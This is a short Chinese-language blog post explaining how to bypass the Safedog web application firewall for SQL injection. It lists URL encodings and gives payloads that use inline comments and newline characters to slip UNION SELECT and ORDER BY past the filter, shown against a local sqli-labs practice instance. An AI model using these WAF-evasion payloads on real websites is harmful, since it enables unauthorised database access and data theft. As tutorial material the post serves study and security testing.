---
title: "安全狗绕过思路" # 文章标题.
date: 2022-11-11
draft: false
tags: ["WAF绕过"]
categories: ["WAF绕过"]
---

# 安全狗绕过思路

如何绕过安全狗呢？

1. 修改提交方式。

   但是对方必须是request请求方法，这样才能够修改提交方式绕过相应的GET/POST

   ```mysql
   select database/**/();
   id=-1 union select 1,database/**/(),3# // post注入，如果不加/**/的话是被拦截的,/**/是注释，/*!*/也是注释(内敛注释)
   ```

2. 一些常见的URL编码

   ```http
   %23: #
   %00: null
   %0a: 换行
   %20: 空格
   %21: !
   %22: "
   %27: '
   ```

3. 根据绕过思路构建的一些Payload

   这些payload是如何构建出来的呢？是我们通过Fuzz方法的到的。这些Payload可能会失效，但是我们有了这些方法之后，我们就可以通过这些方法进而构建出更多的Payload。

   ```mysql
   select * from users where id=-1/*%0a*/union/*%0a*/select/*%0a*/1,2,3;
   %0a是换行
   
   http://192.168.132.132/mypage/sqli-labs/Less-2/?id=1 /*!14400and*/ 1=1
   
   http://192.168.132.132/mypage/sqli-labs/Less-2/?id=1 /**/order/*/%0A*a*/by/**/3--+ # %0A是换行
   SELECT * FROM users WHERE id=1 /**/order/*/换行*a*/by/**/4-- LIMIT 0,1
   ```
